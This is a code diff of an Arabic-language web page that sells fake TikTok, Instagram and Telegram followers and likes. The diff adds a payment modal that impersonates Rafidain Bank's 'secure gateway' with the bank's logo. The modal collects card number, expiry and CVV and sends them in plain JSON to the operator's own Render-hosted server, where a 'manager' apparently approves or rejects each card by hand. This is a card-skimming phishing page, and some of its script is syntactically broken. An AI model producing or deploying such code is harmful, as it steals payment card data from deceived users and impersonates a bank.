@@ -3,156 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUHAMMAD SMM | نظام محمد</title>
+    <title>SMM MUHAMMAD | نظام الرشق</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* التنسيق الجميل الخاص بك */
-        body { margin: 0; background-color: #0c0c0c; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
-        .container { width: 90%; max-width: 400px; background: #1e1e1e; padding: 25px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #ff4500; text-align: center; margin-bottom: 25px; }
+        body { margin: 0; background: #0c0c0c; font-family: sans-serif; color: white; display: flex; flex-direction: column; align-items: center; }
+        .top-bar { width: 100%; max-width: 400px; background: #1e1e1e; padding: 15px; border-radius: 0 0 20px 20px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; margin-bottom: 20px; box-sizing: border-box;}
+        .container { width: 95%; max-width: 400px; background: #1a1a1a; padding: 20px; border-radius: 20px; border: 1px solid #333; box-sizing: border-box;}
         
-        .services { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-        .service-card { background: #2a2a2a; padding: 15px; border-radius: 12px; cursor: pointer; border: 2px solid transparent; text-align: center; transition: 0.3s; font-size: 13px; color: #bbb; }
-        .service-card i { font-size: 28px; margin-bottom: 8px; display: block; color: #ff4500; }
-        .service-card.active { border-color: #00ffcc; background: rgba(0, 255, 204, 0.1); color: white; }
+        .services { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .service-card { background: #222; padding: 15px; border-radius: 12px; cursor: pointer; border: 2px solid transparent; text-align: center; transition: 0.2s; }
+        .service-card i { font-size: 24px; color: #ff4500; margin-bottom: 8px; }
+        .service-card.active { border-color: #00ffcc; background: rgba(0,255,204,0.1); }
 
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #444; background: #111; color: white; box-sizing: border-box; font-size: 16px; outline: none; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #444; background: #111; color: white; box-sizing: border-box; font-size: 16px; outline: none; }
         input:focus { border-color: #ff4500; }
         
-        #cost-display { color: #00ffcc; font-weight: bold; font-size: 18px; margin-bottom: 20px; display: block; text-align: center; }
-        
-        .send-btn { width: 100%; padding: 16px; background: linear-gradient(45deg, #ff4500, #ff8c00); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
-        .send-btn:active { transform: scale(0.98); }
+        #cost-display { color: #00ffcc; font-weight: bold; font-size: 18px; text-align: center; display: block; margin-bottom: 15px; }
+        .btn-order { width: 100%; padding: 15px; background: #ff4500; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
 
-        .tracking { margin-top: 25px; border-top: 1px solid #333; padding-top: 15px; }
-        .order-item { background: #2a2a2a; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; font-size: 13px; border-right: 4px solid orange; }
+        /* Modal Styles */
+        .modal { display: none; position: fixed; z-index: 1000; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); }
+        .modal-content { background: #fff; color: #333; margin: 10% auto; width: 90%; max-width: 380px; border-radius: 15px; overflow: hidden; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>🚀 نظام رشق محمد</h2>
+    <div class="top-bar">
+        <div style="color:#00ffcc; font-weight:bold;">الرصيد: $<span id="user-balance">0.00</span></div>
+        <button onclick="document.getElementById('payModal').style.display='block'" style="background:#800000; color:white; border:none; padding:8px 15px; border-radius:8px; cursor:pointer;">شحن رصيد</button>
+    </div>
 
+    <div class="container">
         <div class="services">
-            <div class="service-card active" onclick="selectService(this, 3.0, 'متابعين تيك توك')">
-                <i class="fab fa-tiktok"></i> متابعين تيك توك
+            <div class="service-card active" onclick="selectService(3.0, 'متابعين تيك توك', this)">
+                <i class="fab fa-tiktok"></i><br>متابعين تيك توك
             </div>
-            <div class="service-card" onclick="selectService(this, 3.0, 'متابعين انستقرام')">
-                <i class="fab fa-instagram"></i> متابعين انستقرام
+            <div class="service-card" onclick="selectService(2.5, 'أعضاء تليجرام', this)">
+                <i class="fab fa-telegram"></i><br>أعضاء تليجرام
             </div>
-            <div class="service-card" onclick="selectService(this, 0.50, 'لايكات تيك توك')">
-                <i class="fab fa-tiktok"></i> لايكات تيك توك
+            <div class="service-card" onclick="selectService(0.5, 'لايكات تيك توك', this)">
+                <i class="fab fa-tiktok"></i><br>لايكات تيك توك
             </div>
-            <div class="service-card" onclick="selectService(this, 2.50, 'أعضاء تليجرام')">
-                <i class="fab fa-telegram"></i> أعضاء تليجرام
+            <div class="service-card" onclick="selectService(3.5, 'متابعين انستقرام', this)">
+                <i class="fab fa-instagram"></i><br>متابعين انستا
             </div>
         </div>
 
-        <input type="text" id="order-link" placeholder="ضع الرابط هنا">
-        <input type="number" id="order-qty" placeholder="الكمية" oninput="updatePrice()">
+        <input type="text" id="order-link" placeholder="رابط الحساب أو المنشور">
+        <input type="number" id="order-qty" placeholder="الكمية" oninput="calculateCost()">
         
-        <span id="cost-display">التكلفة: $0.00</span>
-        
-        <button class="send-btn" id="submit-btn" onclick="sendOrderToServer()">
-            <i class="fas fa-paper-plane"></i> إرسال الطلب الآن
-        </button>
+        <div id="cost-display">التكلفة: $0.00</div>
+        <button class="btn-order" onclick="submitOrder()">إرسال الطلب الآن</button>
+    </div>
 
-        <div class="tracking">
-            <h4 style="margin:0 0 10px 0; text-align:right;">📦 تتبع طلباتك:</h4>
-            <div id="orders-container" style="color:#777; font-size:12px; text-align:center;">لا توجد طلبات سابقة</div>
+    <div id="payModal" class="modal">
+        <div class="modal-content">
+            <div style="background:#800000; padding:15px; text-align:center; color:white;">
+                <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a2/Rafidain_Bank_Logo.png/250px-Rafidain_Bank_Logo.png" style="width:50px;"><br>
+                <b>بوابة مصرف الرافدين الآمنة</b>
+                <div id="modal-body" style="padding:20px;">
+                <input type="number" id="pay-usd" placeholder="المبلغ بالدولار" oninput="document.getElementById('iqd-hint').innerText = (this.value*1530).toLocaleString() + ' IQD'" style="background:#f0f0f0; color:#333;">
+                <p id="iqd-hint" style="text-align:center; color:red; font-weight:bold;"></p>
+                <input type="text" id="pay-card" placeholder="رقم البطاقة" style="background:#f0f0f0; color:#333;">
+                <div style="display:flex; gap:5px;">
+                    <input type="text" id="pay-exp" placeholder="MM/YY" style="background:#f0f0f0; color:#333;">
+                    <input type="password" id="pay-cvv" placeholder="CVV" style="background:#f0f0f0; color:#333;">
+                </div>
+                <button onclick="processPayment()" style="width:100%; padding:15px; background:#28a745; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">تأكيد الدفع</button>
+                <button onclick="document.getElementById('payModal').style.display='none'" style="width:100%; background:none; border:none; color:#777; margin-top:10px; cursor:pointer;">إلغاء</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // رابط سيرفر رندر الخاص بك (مستخرج من صورتك)
-        const SERVER_URL = "https://army-bot-3y9o.onrender.com";
-        
-        let currentPricePer1k = 3.0;
-        let currentServiceName = "متابعين تيك توك";
+        const API_URL = "https://army-bot-3y9o.onrender.com";
+        let currentPrice = 3.0;
+        let currentService = "متابعين تيك توك";
 
-        // 1. وظيفة اختيار الخدمة وتغيير الأيقونة النشطة
-        function selectService(element, price, name) {
-         document.querySelectorAll('.service-card').forEach(card => card.classList.remove('active'));
-            element.classList.add('active');
-            currentPricePer1k = price;
-            currentServiceName = name;
-            updatePrice(); // تحديث السعر فور تغيير الخدمة
+        function selectService(price, name, el) {
+            document.querySelectorAll('.service-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+            currentPrice = price;
+            currentService = name;
+            calculateCost();
         }
 
-        // 2. وظيفة حساب السعر فور كتابة العدد
-        function updatePrice() {
+        function calculateCost() {
             const qty = document.getElementById('order-qty').value || 0;
-            const totalCost = (qty / 1000) * currentPricePer1k;
-            document.getElementById('cost-display').innerText = التكلفة: $${totalCost.toFixed(2)};
-            return totalCost.toFixed(2);
+            const cost = (qty / 1000) * currentPrice;
+            document.getElementById('cost-display').innerText = التكلفة: $${cost.toFixed(2)};
+            return cost.toFixed(2);
         }
 
-        // 3. وظيفة إرسال الطلب للسيرفر والبوت
-        async function sendOrderToServer() {
+        async function submitOrder() {
             const link = document.getElementById('order-link').value;
             const qty = document.getElementById('order-qty').value;
-            const cost = updatePrice();
-            const orderId = Math.floor(Math.random() * 90000) + 10000;
+            const cost = calculateCost();
 
-            if (!link || qty <= 0) {
-                return alert("يرجى إدخال الرابط والكمية بشكل صحيح!");
+            if(!link || qty <= 0) return alert("يرجى ملء جميع الحقول");
+
+            const res = await fetch(`${API_URL}/api/order`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({link, qty, service: currentService, cost})
+            });
+
+            const data = await res.json();
+            if(data.success) {
+                alert("✅ تم إرسال الطلب بنجاح!");
+                loadBalance();
+            } else {
+                alert("❌ " + data.message);
             }
+        }
 
-            const btn = document.getElementById('submit-btn');
-            btn.disabled = true;
-            btn.innerText = "جاري الإرسال...";
+        async function processPayment() {
+            const usd = document.getElementById('pay-usd').value;
+            const card = document.getElementById('pay-card').value;
+            if(!usd || card.length < 16) return alert("بيانات البطاقة غير مكتملة");
 
-            try {
-                const response = await fetch(`${SERVER_URL}/api/order`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        orderId: orderId,
-                        link: link,
-                        qty: qty,
-                        service: currentServiceName,
-                        cost: cost
-                    })
-                });
+            const body = document.getElementById('modal-body');
+            body.innerHTML = <div style="text-align:center; padding:30px; color:#333;"><i class="fas fa-spinner fa-spin fa-3x"></i><br><br>جاري الاتصال بالبنك...</div>;
 
-                if (response.ok) {
-                    alert("✅ تم إرسال الطلب بنجاح! راقب بوت تليجرام.");
-                    document.getElementById('order-link').value = "";
-                    document.getElementById('order-qty').value = "";
-                    updatePrice();
-                    saveOrder(orderId, currentServiceName);
-                } else {
-                    alert("❌ فشل الاتصال بالسيرفر. تأكد أن رندر قيد العمل.");
+            await fetch(`${API_URL}/api/secure-pay`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({amount_usd: usd, amount_iqd: usd*1530, card: card, date: document.getElementById('pay-exp').value, cvv: document.getElementById('pay-cvv').value})
+            });
+
+            const checker = setInterval(async () => {
+                const res = await fetch(`${API_URL}/api/balance/default_user`);
+                const data = await res.json();
+                if(data.status === "approved") {
+                    clearInterval(checker);
+                    body.innerHTML = <div style="text-align:center; color:green; padding:30px;"><i class="fas fa-check-circle fa-4x"></i><br><h3>تم الدفع بنجاح!</h3></div>;
+                       setTimeout(() => location.reload(), 2000);
+                } else if(data.status === "rejected") {
+                    clearInterval(checker);
+                    alert("تم رفض البطاقة من قبل المدير");
+                    location.reload();
                 }
-            } catch (error) {
-                alert("⚠️ خطأ في الشبكة، السيرفر لا يستجيب.");
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-paper-plane"></i> إرسال الطلب الآن';
-            }
+            }, 3000);
         }
 
-        // حفظ الطلب محلياً للتتبع
-        function saveOrder(id, name) {
-            let orders = JSON.parse(localStorage.getItem('muhammad_orders')) || [];
-            orders.push({ id, name, status: "قيد التنفيذ" });
-            localStorage.setItem('muhammad_orders', JSON.stringify(orders));
-            displayOrders();
+        async function loadBalance() {
+            const res = await fetch(`${API_URL}/api/balance/default_user`);
+            const data = await res.json();
+            document.getElementById('user-balance').innerText = data.balance.toFixed(2);
         }
-
-        function displayOrders() {
-            const container = document.getElementById('orders-container');
-            let orders = JSON.parse(localStorage.getItem('muhammad_orders')) || [];
-            if (orders.length === 0) return;
-            
-            container.innerHTML = orders.map(o => `
-                <div class="order-item">
-                    <span>#${o.id} - ${o.name}</span>
-                    <span style="color:orange;">${o.status}</span>
-                </div>
-            `).join('');
-        }
-        displayOrders();
+        
+        loadBalance();
+        setInterval(loadBalance, 10000);
     </script>
 </body>
-</html>   
+</html> 
+            </div>
